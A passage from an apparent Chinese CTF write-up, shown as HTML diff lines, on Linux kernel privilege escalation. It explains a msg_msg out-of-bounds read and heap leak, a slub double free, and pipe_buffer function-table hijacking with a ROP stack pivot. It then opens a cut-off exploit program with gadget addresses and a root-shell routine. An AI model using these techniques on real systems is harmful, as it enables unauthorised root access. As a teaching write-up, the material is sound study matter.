src_pseg-&gt;next) &#123;<br><br>		len -= alen;<br>		alen = min(len, DATALEN_SEG);<br>		<span class="hljs-built_in">memcpy</span>(dst_pseg + <span class="hljs-number">1</span>, src_pseg + <span class="hljs-number">1</span>, alen);<br>	&#125;<br><br>	dst-&gt;m_type = src-&gt;m_type;<br>	dst-&gt;m_ts = src-&gt;m_ts;<br><br>	<span class="hljs-keyword">return</span> dst;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>因此我们需要确保<strong>获得一个合法的堆上地址进行搜索的同时</strong>确保我们所构造的<strong>next 链上皆为合法地址，并以 NULL 结尾</strong>，如何找到这样一个地址？</p>
+<p>我们都知道，slub 会向 buddy system 申请一张或多张连续内存页，将其分割为指定大小的 object 之后再返还给 kmalloc 的 caller，对于大小为 1024 的 object，其每次申请的连续内存页为四张，分为 16 个 object</p>
+<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs vim">$ sudo <span class="hljs-keyword">cat</span> /proc/<span class="hljs-keyword">sla</span> <br>Password: <br>slabinfo - <span class="hljs-keyword">version</span>: <span class="hljs-number">2.1</span><br># name            <span class="hljs-symbol">&lt;active_objs&gt;</span> <span class="hljs-symbol">&lt;num_objs&gt;</span> <span class="hljs-symbol">&lt;objsize&gt;</span> <span class="hljs-symbol">&lt;objperslab&gt;</span> <span class="hljs-symbol">&lt;pagesperslab&gt;</span> : tunables <span class="hljs-symbol">&lt;limit&gt;</span> <span class="hljs-symbol">&lt;batchcount&gt;</span> <span class="hljs-symbol">&lt;sharedfactor&gt;</span> : slabdata <span class="hljs-symbol">&lt;active_slabs&gt;</span> <span class="hljs-symbol">&lt;num_slabs&gt;</span> <span class="hljs-symbol">&lt;sharedavail&gt;</span><br># ...<br>kmalloc-<span class="hljs-number">1</span><span class="hljs-keyword">k</span>          <span class="hljs-number">3341</span>   <span class="hljs-number">3584</span>   <span class="hljs-number">1024</span>   <span class="hljs-number">16</span>    <span class="hljs-number">4</span> : tunables    <span class="hljs-number">0</span>    <span class="hljs-number">0</span>    <span class="hljs-number">0</span> : slabdata    <span class="hljs-number">224</span>    <span class="hljs-number">224</span>      <span class="hljs-number">0</span><br># ...<br><br>SHELL<br></code></pre></td></tr></table></figure>
+
+<p>我们不难想到的是，若是我们<strong>分配多个大小同为 1024 的 msg_msg 结构体，则其很容易落在地址连续的 4 张内存页上</strong>，此时若是我们从其中一个 msg_msg 结构体向后进行越界读，<strong>则很容易读取到其他的 msg_msg 结构体的数据</strong>，其 m_list 成员可以帮助我们泄露出一个堆上地址</p>
+<p>那么这个堆上地址指向哪呢？让我们将目光重新放回 <code>msg_queue</code> 与 <code>msg_msg</code> 结构体之间的关系，当一个消息上只有一个 message 时，我们不难看出 msg_msg 的 prev 与 next 指针都指向 msg_queue 的 <code>q_messages</code> 域，对应地， msg_queue-&gt;q_message 的 prev 与 next 也同样指向 msg_msg 的 <code>m_list</code> 域</p>
+<p><a target="_blank" rel="noopener" href="https://s2.loli.net/2022/02/24/sD9xtpaHrQ2uneZ.png"><img src="https://s2.loli.net/2022/02/24/sD9xtpaHrQ2uneZ.png" srcset="/img/loading.gif" lazyload alt="image.png"></a></p>
+<p>此时我们不难想到，<strong>我们可以将 msg_msg 的 next 指针指回 msg_queue，从而读出上面的指向 msg_msg 的指针，将未知的地址变为已知的地址</strong>，之后我们在搜索时便可以选择从该地址开始搜索，这样我们就能知道每次搜索时获得的每一条数据的地址，<strong>从而在每次搜索时能够挑选已知数据为 NULL 的区域作为 next-&gt;next 以避免 kernel panic</strong>，以此获得连续的搜索内存的能力</p>
+<p>但是这有一个小要求，我们在泄露 msg_msg 地址时应当选取 msg_queue-&gt;q_message 往前的一块为 NULL 的区域作为 msg_msg-&gt;next，不过令笔者欣喜的是，<code>msg_queue-&gt;q_lrpid</code> 在未使用 msgrcv 接收消息时<strong>为 NULL</strong>，该成员在 q_message 成员向前的 8 字节处，因此我们可以将 next 指针指向这个位置</p>
+<p><a target="_blank" rel="noopener" href="https://s2.loli.net/2022/02/25/5fOESRbu6Zan7mU.png"><img src="https://s2.loli.net/2022/02/25/5fOESRbu6Zan7mU.png" srcset="/img/loading.gif" lazyload alt="image.png"></a></p>
+<p>至于如何泄露.text段的data，笔者直接</p>
+<blockquote>
+<p>可能有的人会想到一个更为快捷的办法：因为我们已经获得了内核的“堆上地址”，所以我们可以去猜测“堆的基址”（<code>page_offset_base</code>），在 <code>page_offset_base + 0x9d000</code> 处<strong>固定存放着</strong> <code>secondary_startup_64</code> 函数的地址，而这个地址前面刚好有一片为 0 的区域方便我们的 next 指针进行指向</p>
+<p>但这个做法有一定的风险：若是我们猜错了则很容易导致 kernel panic，且经笔者尝试会在我们的下一步中<strong>导致 kernel panic</strong>（也可能是笔者的构造存在缺陷），所以笔者还是更推荐大家只用内存搜索的办法</p>
+</blockquote>
+<h3 id="Step-III-构造-A-B-A-式-freelist-劫持新的结构体"><a href="#Step-III-构造-A-B-A-式-freelist-劫持新的结构体" class="headerlink" title="Step.III 构造 A-&gt;B-&gt;A 式 freelist 劫持新的结构体"></a>Step.III 构造 A-&gt;B-&gt;A 式 freelist 劫持新的结构体</h3><p>现在地址泄露的工作已经完成了，接下来我们来考虑如何进行提权，比较朴素的提权方法有两种：修改进程 cred 结构体或是劫持内核执行流</p>
+<p>对于前一种方法我们需要获得内核中的任意地址写，可能此时有的同学已经想到了利用 userfaultfd + msg_msg 这一任意写方法，而现在我们有着内存搜索技术，自然可以直接使用 prctl 设置 task_struct 的 comm 成员后进行暴力搜索，但首先<strong>我们并不知道 PCB 地址在当前已知堆地址的前方还是后方</strong>，无论搜索前向越界还是后向越界到了非法地址都会引起 kernel panic，且自内核版本 5.11 起 <strong>userfaultfd 系统调用被限制为 root 权限才能使用</strong>，因此笔者选择控制一些有着函数指针的结构体从而劫持内核执行流</p>
+<p>那么我们要将该 object 分配到别的地方，还要能对其进行修改，那么我们<strong>必须要先将该 object 放回 slub 中</strong>，因为此时该 object 虽为 free 状态，但当我们将其分配到别的结构体上后<strong>我们便无法再控制其内容</strong>，因为此时原 msg_msg 结构体的数据会被新结构体覆盖，<strong>无法正常被释放</strong>（过不了 msgrcv 中的 unlink）</p>
+<p>因此接下来我们的工作便是先维修 msg_msg 中的双向链表，让其指向内核堆上一个合法的地址，同时让 next 指针为 NULL 即可，这里我们可以直接选择使用 setxattr 完成修复，可能有的同学这里会有疑问：m_list 成员位于 msg_msg 的前 16 字节，在 setxattr 将其放回 slub 时<strong>难道不会又将其修改为一个 slub 中的指针从而破坏双向链表么</strong>？开启了 hardened freelist 保护时 free object 的 next 指针字面量并非一个合法地址。这里我们就要说到 slub 的一个特性了：</p>
+<ul>
+<li>不同于 glibc 中空闲堆块固定使用前 8 字节的组织方式，在 slub 中空闲的 object 在其对应的 kmem_cache-&gt;offset 处存放下一个 free object 的指针（开启了 hardened freelist 保护时该值为当前 object 与 下一个 object 地址再与一个 random 值总共三个值进行异或的结果）</li>
+</ul>
+<p>经笔者多次测试，对于这种较大的 object 而言，其 offset 通常会大于 msg_msg header 的大小，因此我们可以进行完美修复</p>
+<p>修复完成之后我们考虑如何进行 double free，因为 slub 的释放函数并没有太多的保护，如同 glibc 中的 fastbin 一般只会检查 freelist 上的第一个 object，因此我们只需要像做用户态 pwn 题那样构造 A-&gt;B-&gt;A 的释放链便能将 UAF 再应用到其他内核结构体上</p>
+<h3 id="Step-IV-pipe-buffer-劫持-RIP"><a href="#Step-IV-pipe-buffer-劫持-RIP" class="headerlink" title="Step.IV pipe_buffer 劫持 RIP"></a>Step.IV pipe_buffer 劫持 RIP</h3><p>最后我们来挑选一个内核结构体来劫持 RIP，这里笔者选择了 <code>pipe_buffer</code> 这一结构体，当我们创建一个管道时，在内核中会生成数个连续的该结构体，申请的内存总大小刚好会让内核从 kmalloc-1k 中取出一个 object</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> *	struct pipe_buffer - a linux kernel pipe buffer</span><br><span class="hljs-comment"> *	@page: the page containing the data for the pipe buffer</span><br><span class="hljs-comment"> *	@offset: offset of data inside the @page</span><br><span class="hljs-comment"> *	@len: length of data inside the @page</span><br><span class="hljs-comment"> *	@ops: operations associated with this buffer. See @pipe_buf_operations.</span><br><span class="hljs-comment"> *	@flags: pipe buffer flags. See above.</span><br><span class="hljs-comment"> *	@private: private data owned by the ops.</span><br><span class="hljs-comment"> **/</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buffer</span> &#123;</span><br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">page</span> *<span class="hljs-title">page</span>;</span><br>	<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> offset, len;<br>	<span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buf_operations</span> *<span class="hljs-title">ops</span>;</span><br>	<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> flags;<br>	<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> private;<br>&#125;;<br></code></pre></td></tr></table></figure>
+
+<p>而当我们关闭了管道的两端时，会触发 <code>pipe_buffer-&gt;pipe_buffer_operations-&gt;release</code> 这一指针，因此我们只需要劫持其函数表即可，劫持的位置也很清晰：前面我们在搜索内存时获取到了其中一个 msg_msg 的地址，只需要减去其与被用于 UAF 的 object 的地址之间的偏移即可，这个偏移值在搜索过程中是可以计算出来的</p>
+<p>之后我们将函数表劫持到 pipe_buffer 所处 object 上，在该 object 上布置好 ROP 链，再选一条合适的用于栈迁移的 gadget 即可</p>
+<p>经笔者实测，此时的 rsi 寄存器指向 pipe_buffer，因此笔者选择了一条 <code>push rsi ; pop rsp ; pop 4 vals ; ret</code> 的 gadget 完成栈迁移</p>
+<p><a target="_blank" rel="noopener" href="https://s2.loli.net/2022/02/25/daklBHtIYCs3K6q.png"><img src="https://s2.loli.net/2022/02/25/daklBHtIYCs3K6q.png" srcset="/img/loading.gif" lazyload alt="image.png"></a></p>
+<h3 id="FINAL-EXPLOIT"><a href="#FINAL-EXPLOIT" class="headerlink" title="FINAL EXPLOIT"></a>FINAL EXPLOIT</h3><p>最终的 exp 如下：</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">define</span> _GNU_SOURCE</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;pthread.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sched.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/ipc.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/msg.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/socket.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/syscall.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/types.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/xattr.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> MSG_COPY</span><br>    <span class="hljs-meta">#<span class="hljs-keyword">define</span> MSG_COPY        040000  <span class="hljs-comment">/* copy (not remove) all queue messages */</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> OBJ_ADD     0x1234</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> OBJ_EDIT    0x4321</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> OBJ_SHOW 	0xbeef</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> OBJ_DEL     0xdead</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PREPARE_KERNEL_CRED 0xffffffff810d2ac0</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> INIT_CRED 0xffffffff82c6d580</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> COMMIT_CREDS 0xffffffff810d25c0</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE 0xffffffff81c00ff0</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> POP_RDI_RET 0xffffffff810938f0</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SECONDARY_STARTUP_64 0xffffffff81000040</span><br><br><span class="hljs-type">size_t</span> user_cs, user_ss, user_sp, user_rflags;<br><span class="hljs-type">size_t</span> kernel_offset, kernel_base = <span class="hljs-number">0xffffffff81000000</span>;<br><span class="hljs-type">size_t</span> prepare_kernel_cred, commit_creds, swapgs_restore_regs_and_return_to_usermode, init_cred;<br><br><span class="hljs-type">long</span> dev_fd;<br><span class="hljs-type">int</span> pipe_fd[<span class="hljs-number">2</span>], pipe_fd2[<span class="hljs-number">2</span>], pipe_fd_1;<br><br><span class="hljs-function"><span class="hljs-type">size_t</span> <span class="hljs-title">kernelLeakQuery</span><span class="hljs-params">(<span class="hljs-type">size_t</span> kernel_text_leak)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">size_t</span> kernel_offset = <span class="hljs-number">0xdeadbeef</span>;<br>    <span class="hljs-keyword">switch</span> (kernel_text_leak &amp; <span class="hljs-number">0xfff</span>)<br>    &#123;<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">0x6e9</span>:<br>            kernel_offset = kernel_text_leak - <span class="hljs-number">0xffffffff812b76e9</span>;<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">0x980</span>:<br>            kernel_offset = kernel_text_leak - <span class="hljs-number">0xffffffff82101980</span>;<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">0x440</span>:<br>            kernel_offset = kernel_text_leak - <span class="hljs-number">0xffffffff82e77440</span>;<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">0xde7</span>:<br>            kernel_offset = kernel_text_leak - <span class="hljs-number">0xffffffff82411de7</span>;<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">0x4f0</span>:<br>            kernel_offset = kernel_text_leak - <span class="hljs-number">0xffffffff817894f0</span>;<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">0xc90</span>:<br>            kernel_offset = kernel_text_leak - <span class="hljs-number">0xffffffff833fac90</span>;<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">0x785</span>:<br>            kernel_offset = kernel_text_leak - <span class="hljs-number">0xffffffff823c3785</span>;<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">0x990</span>:<br>            kernel_offset = kernel_text_leak - <span class="hljs-number">0xffffffff810b2990</span>;<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">0x900</span>:<br>            kernel_offset = kernel_text_leak - <span class="hljs-number">0xffffffff82e49900</span>;<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">0x8b4</span>:<br>            kernel_offset = kernel_text_leak - <span class="hljs-number">0xffffffff8111b8b4</span>;<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">0xc40</span>:<br>            kernel_offset = kernel_text_leak - <span class="hljs-number">0xffffffff8204ac40</span>;<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">0x320</span>:<br>            kernel_offset = kernel_text_leak - <span class="hljs-number">0xffffffff8155c320</span>;<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">0xee0</span>:<br>            kernel_offset = kernel_text_leak - <span class="hljs-number">0xffffffff810d6ee0</span>;<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">0x5e0</span>:<br>            kernel_offset = kernel_text_leak - <span class="hljs-number">0xffffffff810e55e0</span>;<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">0xe80</span>:<br>            kernel_offset = kernel_text_leak - <span class="hljs-number">0xffffffff82f05e80</span>;<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">0x260</span>:<br>            kernel_offset = kernel_text_leak - <span class="hljs-number">0xffffffff82ec0260</span>;<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">default</span>:<br>            <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[x] fill up your dict!&quot;</span>);<br>            <span class="hljs-keyword">break</span>;<br>    &#125;<br>    <span class="hljs-keyword">if</span> ((kernel_offset % <span class="hljs-number">0x100000</span>) != <span class="hljs-number">0</span>) <span class="hljs-comment">// miss hit?</span><br>        kernel_offset = <span class="hljs-number">0xdeadbeef</span>;<br>    <span class="hljs-keyword">return</span> kernel_offset;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">add</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">ioctl</span>(dev_fd, OBJ_ADD);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">del</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">ioctl</span>(dev_fd, OBJ_DEL);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">saveStatus</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    __asm__(<span class="hljs-string">&quot;mov user_cs, cs;&quot;</span><br>            <span class="hljs-string">&quot;mov user_ss, ss;&quot;</span><br>            <span class="hljs-string">&quot;mov user_sp, rsp;&quot;</span><br>            <span class="hljs-string">&quot;pushf;&quot;</span><br>            <span class="hljs-string">&quot;pop user_rflags;&quot;</span><br>            );<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] Status has been saved.\033[0m\n&quot;</span>);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">getRootShell</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span></span><br><span class="hljs-function"></span>&#123;   <br>    <span class="hljs-keyword">if</span>(<span class="hljs-built_in">getuid</span>())<br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[31m\033[1m[x] Failed to get the root!\033[0m\n&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>    &#125;<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Successful to get the root. Execve root shell now...\033[0m\n&quot;</span>);<br>    <span class="hljs-built_in">system</span>(<span class="hljs-string">&quot;cat /flag;/bin/sh&quot;</span>);<br>    <span class="hljs-built_in">exit</span>(EXIT_SUCCESS);<br>&#125;<br><br><span class="hljs-keyword">typedef</span> <span class="hljs-keyword">struct</span><br>&#123;<br>        <span class="hljs-type">long</span> mtype;<br>        <span class="hljs-type">char</span> mtext[<span 